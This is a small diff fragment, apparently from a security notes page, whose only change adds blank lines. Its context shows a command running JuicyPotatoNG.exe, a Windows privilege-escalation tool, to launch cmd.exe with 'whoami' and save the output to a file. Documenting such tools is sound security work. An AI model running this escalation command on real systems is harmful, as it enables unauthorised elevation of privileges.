@@ -14,3 +14,5 @@ updated_at: '2023-04-10T20:37:34.799796+00:00'
 ```bash
 JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami" > C:\juicypotatong.txt
 ```
+
+
